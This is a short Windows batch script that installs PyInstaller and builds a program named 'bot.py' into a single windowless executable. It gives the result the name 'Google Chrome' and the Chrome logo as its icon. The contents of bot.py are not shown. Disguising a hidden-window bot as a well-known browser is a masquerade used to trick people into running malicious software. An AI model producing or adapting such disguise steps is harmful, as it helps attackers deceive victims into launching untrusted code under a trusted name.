@echo off

python -m pip install pyinstaller

pyinstaller --noconfirm --onefile --windowed --icon "Google-Chrome-Logo-1536x1536-3017027129.ico" --name "Google Chrome"  "bot.py"